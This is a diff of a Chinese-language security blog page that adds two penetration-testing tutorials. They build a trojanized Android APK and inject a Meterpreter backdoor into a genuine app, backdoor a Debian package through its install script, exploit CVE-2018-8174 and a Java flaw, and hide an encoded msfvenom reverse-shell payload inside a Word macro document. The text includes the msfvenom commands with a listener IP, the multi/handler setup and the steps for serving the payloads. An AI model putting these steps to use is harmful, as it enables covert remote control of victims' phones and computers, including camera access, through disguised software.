@@ -116,7 +116,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">22</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">59</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>
 
   </li>
   </ul>
@@ -152,6 +152,494 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">Android客户端渗透</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-18 18:29:35" itemprop="dateCreated datePublished" datetime="2021-08-18T18:29:35+08:00">2021-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-08 10:36:02" itemprop="dateModified" datetime="2021-10-08T10:36:02+08:00">2021-10-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Android客户端渗透"><a href="#Android客户端渗透" class="headerlink" title="Android客户端渗透"></a>Android客户端渗透</h1><h2 id="一、back-door程序渗透Android"><a href="#一、back-door程序渗透Android" class="headerlink" title="一、back door程序渗透Android"></a>一、back door程序渗透Android</h2><p>步骤1：使用MSF生成一个apk的back door应用程序</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162007668.png" alt="image-20210818162007668"></p>
+<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 R &gt;xuegod.apk</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162243078.png" alt="image-20210818162243078"></p>
+<p>步骤2：监听</p>
+<p>启动msf</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
+<p>加载渗透模块并配置参数</p>
+<p>use exploit/multi/handler</p>
+<p>set payload android/meterpreter/reverse_tcp</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
+<p>步骤3：</p>
+<p>手机端下载并打开程序</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162318121.png" alt="image-20210818162318121"></p>
+<p>kali端，会话建立成功</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162707785.png" alt="image-20210818162707785"></p>
+<p>操控命令说明补充：</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162741892.png" alt="image-20210818162741892"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162808076.png" alt="image-20210818162808076"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162903481.png" alt="image-20210818162903481"></p>
+<p>二、将木马隐藏到正版app中<br>说明：请勿在Kali2019.4版本中操作，可能存在兼容问题</p>
+<p><strong>步骤1：搭建环境</strong></p>
+<p>禁用ipv6</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163134441.png" alt="image-20210818163134441"></p>
+<p>下载工具</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163211629.png" alt="image-20210818163211629"></p>
+<p>解压文件</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163316767.png" alt="image-20210818163316767"></p>
+<p>解压结果</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163357630.png" alt="image-20210818163357630"></p>
+<p>修改程序</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163458535.png" alt="image-20210818163458535"></p>
+<p><strong>步骤2：</strong>注入back door到apk</p>
+<p>载入要注入back door的apk和apktool.jar工具到kali（注意路径）</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163928062.png" alt="image-20210818163928062"></p>
+<p>进入apk工具（这里用到逆向与注入）</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164112162.png" alt="image-20210818164112162"></p>
+<p>选择第3项（输入3)，然后配置参数</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164734783.png" alt="image-20210818164734783"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164643208.png" alt="image-20210818164643208"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164805027.png" alt="image-20210818164805027"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164849132.png" alt="image-20210818164849132"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165009619.png" alt="image-20210818165009619"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165125523.png" alt="image-20210818165125523"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170027865.png" alt="image-20210818170027865"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170140902.png" alt="image-20210818170140902"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170211040.png" alt="image-20210818170211040"></p>
+<p>补充：</p>
+<p>出错情况1：</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164416940.png" alt="image-20210818164416940"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164435145.png" alt="image-20210818164435145"></p>
+<p>出错情况2：</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165254757.png" alt="image-20210818165254757"></p>
+<p>解决方法</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165616957.png" alt="image-20210818165616957"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165818720.png" alt="image-20210818165818720"></p>
+<p>步骤3：手动启动msf的监听（该步骤非必须，也可以用它自带的，如步骤2结果）</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
+<p>步骤4：启动apache2服务</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170535594.png" alt="image-20210818170535594"></p>
+<p>把apk放到根目录方便下载</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170632278.png" alt="image-20210818170632278"></p>
+<p>步骤5：Android手机下载并安装apk</p>
+<p>安装过程略，启动运行软件后</p>
+<p>直接上结果</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170902403.png" alt="image-20210818170902403"></p>
+<p>补充：</p>
+<p>启动摄像头</p>
+<p><img src="/2021/08/18/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170957413.png" alt="image-20210818170957413"></p>
+<p>注意：手机端会提示是是否打开摄像头</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">利用deb包-0day-java环境进行渗透</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-18 16:17:01" itemprop="dateCreated datePublished" datetime="2021-08-18T16:17:01+08:00">2021-08-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-08 11:16:10" itemprop="dateModified" datetime="2021-10-08T11:16:10+08:00">2021-10-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="利用deb包-0day-java环境进行渗透"><a href="#利用deb包-0day-java环境进行渗透" class="headerlink" title="利用deb包-0day-java环境进行渗透"></a>利用deb包-0day-java环境进行渗透</h1><h2 id="一、制作恶意deb软件包来触发back-door"><a href="#一、制作恶意deb软件包来触发back-door" class="headerlink" title="一、制作恶意deb软件包来触发back door"></a>一、制作恶意deb软件包来触发back door</h2><p><strong>以freesweep软件包为例子</strong> </p>
+<p>步骤1：下载正版的freesweep软件包</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154438382.png" alt="image-20210817154438382"></p>
+<p>步骤2：</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154803409.png" alt="image-20210817154803409"></p>
+<p><strong>命令说明</strong>：把EOF重定向（写入）到/root/free/DEBIAN/control里；EOF是指其下一行开始到最后EOF那一行的所有内容</p>
+<p><strong>补充</strong>：也可以进入目录用vim写入，如下</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154555203.png" alt="image-20210817154555203"></p>
+<p>确保路径存在（目录不存在，则要自己创建），注意大小写、顺序。</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817154651297.png" alt="image-20210817154651297"></p>
+<p>步骤3：创建deb软件包，安装后脚步文件来加载back door</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155435610.png" alt="image-20210817155435610"></p>
+<p>设置文件执行权限</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155637985.png" alt="image-20210817155637985"></p>
+<p>重新打包软件包</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817155808883.png" alt="image-20210817155808883"></p>
+<p>说明：文件夹叫什么名，打包出来的软件包就叫什么名</p>
+<p>步骤4：效果演示</p>
+<p><strong>监听</strong></p>
+<p>环境：一台kali（自己监听自己）</p>
+<p>进入msf</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160019739.png" alt="image-20210817160019739"></p>
+<p>加载监听模块并配置参数</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160301457.png" alt="image-20210817160301457"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160347828.png" alt="image-20210817160347828"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160457759.png" alt="image-20210817160457759"></p>
+<p>打开另外一个控制台安装软件包</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160543619.png" alt="image-20210817160543619"></p>
+<p>结果：会话建立成功</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160622947.png" alt="image-20210817160622947"></p>
+<p>补充：软件包被卸载后，会话会自动断开</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817160756710.png" alt="image-20210817160756710"></p>
+<h2 id="二、利用0DAY漏洞CVE-2018-8174获取shell"><a href="#二、利用0DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="二、利用0DAY漏洞CVE-2018-8174获取shell"></a>二、利用0DAY漏洞CVE-2018-8174获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165222216.png" alt="image-20210817165222216"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165327932.png" alt="image-20210817165327932"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165542797.png" alt="image-20210817165542797"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817165853688.png" alt="image-20210817165853688"></p>
+<p>将恶意文件拷贝到web根目录下，</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170035572.png" alt="image-20210817170035572"></p>
+<p>开启apache服务</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170128424.png" alt="image-20210817170128424"></p>
+<p>加载和配置模块</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170259965.png" alt="image-20210817170259965"></p>
+<p>在window下启动恶意文件，要注意payload设置</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170320356.png" alt="image-20210817170320356"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170330785.png" alt="image-20210817170330785"></p>
+<p>启动，监听</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170444127.png" alt="image-20210817170444127"></p>
+<p>3.启动恶意文件</p>
+<p>注意：该漏洞针对的是ie浏览器和IE内核的浏览器（如360浏览器）</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170646899.png" alt="image-20210817170646899"></p>
+<p>结果</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210817170726851.png" alt="image-20210817170726851"></p>
+<h2 id="三、基于java环境的漏洞获取shell"><a href="#三、基于java环境的漏洞获取shell" class="headerlink" title="三、基于java环境的漏洞获取shell"></a>三、基于java环境的漏洞获取shell</h2><p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101510091.png" alt="image-20210818101510091"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101548466.png" alt="image-20210818101548466"></p>
+<p>说明：该漏洞与jre的版本有关，其他版本可能不行</p>
+<p>步骤1：加载模块</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101727843.png" alt="image-20210818101727843"></p>
+<p>步骤2：配置payload并启动</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101835440.png" alt="image-20210818101835440"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101854499.png" alt="image-20210818101854499"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818101932255.png" alt="image-20210818101932255"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102202346.png" alt="image-20210818102202346"></p>
+<p>补充：需要打开apache2服务</p>
+<p>步骤3：可能会弹出的提示框操作与结果展示</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102503192.png" alt="image-20210818102503192"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102538395.png" alt="image-20210818102538395"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102625422.png" alt="image-20210818102625422"></p>
+<p>结果（会话可能后台运行了）</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102811873.png" alt="image-20210818102811873"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818102839600.png" alt="image-20210818102839600"></p>
+<h2 id="四、利用宏感染word文档获取shell"><a href="#四、利用宏感染word文档获取shell" class="headerlink" title="四、利用宏感染word文档获取shell"></a>四、利用宏感染word文档获取shell</h2><p>步骤1：生成宏恶意文件</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818103109953.png" alt="image-20210818103109953"></p>
+<p>指令：msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104623212.png" alt="image-20210818104623212"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104647745.png" alt="image-20210818104647745"></p>
+<p>将上面这段代码放到word里的宏。</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818104807569.png" alt="image-20210818104807569"></p>
+<p>payload放到文件内容（将其隐藏）</p>
+<p>如图操作</p>
+<p>宏设置：</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105017122.png" alt="image-20210818105017122"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105121898.png" alt="image-20210818105121898"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105236492.png" alt="image-20210818105236492"></p>
+<p>payload操作：</p>
+<p>将kali生成的payload代码放入刚保存的带宏的文件中</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105437540.png" alt="image-20210818105437540"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105600439.png" alt="image-20210818105600439"></p>
+<p>隐藏效果</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105613376.png" alt="image-20210818105613376"></p>
+<p>再在前面输入正常内容</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105658221.png" alt="image-20210818105658221"></p>
+<p>步骤2：监听</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105902905.png" alt="image-20210818105902905"></p>
+<p>LHOST是指监听者的ip地址</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105925383.png" alt="image-20210818105925383"></p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105957052.png" alt="image-20210818105957052"></p>
+<p>步骤3：效果</p>
+<p>目标机打开文件</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110059162.png" alt="image-20210818110059162"></p>
+<p>攻击者</p>
+<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110159404.png" alt="image-20210818110159404"></p>
+<p>补充：该文件如果发到其他主机，其他主机也可能会被感染/遭受攻击</p>
